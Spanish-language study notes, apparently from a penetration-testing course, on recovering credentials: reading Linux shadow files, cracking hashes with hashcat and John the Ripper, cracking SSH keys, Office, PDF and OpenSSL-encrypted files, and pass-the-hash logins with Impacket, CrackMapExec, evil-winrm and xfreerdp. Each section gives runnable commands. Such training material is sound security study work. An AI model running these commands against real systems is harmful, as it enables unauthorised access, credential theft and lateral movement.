
###BUSCAR CONTRASEÑAS EN LINUX
Las contraseñas pueden encontrarse en archivos, memoria, y key rings. El segundo hace referencia a registros, procesos y el ultimo a creds almacenadas en navegador.
En linux todo es un archivo, por lo cual es importante enumerar los de configuracion, base de datos (cronjobs) y de texto para encontrar algo.

	##Archivos de CONFiguracion
	usr : contraseña encriptada : ult modif : min passw age : max passw age : warning perod : inactivity period : vencimmiento : unused
	#En el caso de que la contraseña aparezca como ! o * el usr no se puede loguear con contraseña UNIX. Pude haber otros metodos de logg como kerberos o key-based.
	#Si el field de la passwd esta vacio quiere decir que no se requiere password para loguearse como el objetivo.

	##/etc/security/opasswd
	La libreria PAM puede prevenir el reuso de contraseñas antiguas. En este directorio es donde se almacenan y se requiere acceso como administrador para manipular el archivo.
	
	
	##CRAKCIN hashes
	unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
	#Creamos unshadow para poder pasarle a hashcat o john
	hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
	#Crackeamos el hash con rockyou list

###ARCHIVOS PROTEGIDOS
	##SSH
	Si encontramos una private key, por lo general suelen tener una contraseña. Muchas veces esta contraseña es debil por la confianza en SSH.
	ssh2john.py SSH.private > ssh.hash
	#Obtenemos el hash de la private para romperlo
	john --wordlist=rockyou.txt ssh.hash
	#Intentamos rommper el hash mediante un diccionario

	##DOCUMENTOS
	Los documentos de office tambien tiene contraseña
	office2john.py Protected.docx > protected-docx.hash
	#De esta forma intentamos obbtener el hash para intentar romperlo
	john --wordlist=rockyou.txt protected-docx.hash
	#Igual que antes, de esta forma buscamos romper el hash
	
	##PDF
	pdf2john.py PDF.pdf > pdf.hash
	#El resto es igual...
	
	Lo mas complicado va a seguir siendo la creacion de listas mutadas para poder decifrar con exito el hash.	

	#IMPORTANTE
	John tiene muchas archivos mas para obtener hash e intentar romperlos. Algunos otros puede ser los zip.

	##OpenSSL
	for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
	#Puesto que decifrar openssl puede arrojar falsos positivos, un for es la mejor opcion

	
###PASS THE HASH
	##      Definiciones    ##
	PTH es una tecnica en donde un atacante no necesita la contrase;a para loguearse sino simplemente el hash de la misma.
	
	## PTH with Impacket PsExec
	impacket-psexec <user>@<target ip> -hashes :<hash>
	#Ademas de este existe: impacket-wmiexec; impacket-atexec y impacket-smbexec que pueden usarse de la misma forma

	## PTH with CrackMapExec
	crackmapexec smb 172.16.1.0/24 -u Administrator -d <dominio> -H <hash>
	#Para verificar en un rango de ip's a donde podemos conectarnos con el hash que encontramos
	crackmapexec smb 10.129.201.126 -u Administrator -d <dominio> -H <hash> -x <command>
	#Una vez encontrado una ip con la que podamos conectarnos, podemos ejecutar comandos con -x

	## PTH with evil-winrm
	evil-winrm -i <target ip> -u <usuario> -H <hash>
	#Obtenemos una shell si todo es correcto
	
	## PTH with RDP
	Pueden darse errores al tener que conectarse. Mas info: https://academy.hackthebox.com/module/147/section/1638
	
	xfreerdp  /v:<target ip> /u:<usuario> /pth:<hash>
	#Coneccion mediante RDP con el hash
